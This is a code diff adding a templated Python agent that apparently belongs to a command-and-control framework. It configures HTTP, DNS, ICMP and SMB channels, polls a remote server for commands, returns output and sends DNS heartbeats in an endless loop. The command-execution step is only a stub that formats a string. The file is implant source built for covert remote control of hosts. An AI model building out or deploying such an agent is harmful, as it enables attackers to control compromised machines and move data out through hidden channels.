@@ -1,0 +1,52 @@
+# agent_template.py.j2
+import json
+import time
+import asyncio
+from Agent.agent_comm import HTTPComm, DNSComm, ICMPComm, SMBComm
+
+# The agent configuration is embedded directly as a Python dict.
+CONFIG = {{ config_json }}
+
+def load_config():
+    return CONFIG
+
+async def run_protocols(config):
+    protocols = config.get("protocols", {})
+    poll_interval = config.get("poll_interval", 10)
+    agent_id = config.get("agent_id")
+    auth_token = config.get("auth_token", "PLACEHOLDER")
+    comms = {}
+
+    if protocols.get("http", {}).get("enabled"):
+        comms["http"] = HTTPComm(protocols["http"]["server_url"])
+    if protocols.get("dns", {}).get("enabled"):
+        comms["dns"] = DNSComm(protocols["dns"]["dns_server_ip"])
+    if protocols.get("icmp", {}).get("enabled"):
+        comms["icmp"] = ICMPComm(protocols["icmp"]["target_ip"])
+    if protocols.get("smb", {}).get("enabled"):
+        comms["smb"] = SMBComm(protocols["smb"]["server_ip"])
+
+    while True:
+        # Example: HTTP polling for commands
+        if "http" in comms:
+            commands = comms["http"].poll_commands(agent_id, auth_token)
+            for command in commands:
+                print("Received HTTP command:", command)
+                # Execute the command locally and capture output
+                output = f"Executed command: {command}"
+                comms["http"].send_output(agent_id, auth_token, output)
+
+        # Optionally send a heartbeat via DNS
+        if "dns" in comms:
+            dns_response = comms["dns"].send_message("heartbeat")
+            if dns_response:
+                print("Received DNS response:", dns_response)
+
+        await asyncio.sleep(poll_interval)
+
+def main():
+    config = load_config()
+    asyncio.run(run_protocols(config))
+
+if __name__ == "__main__":
+    main()
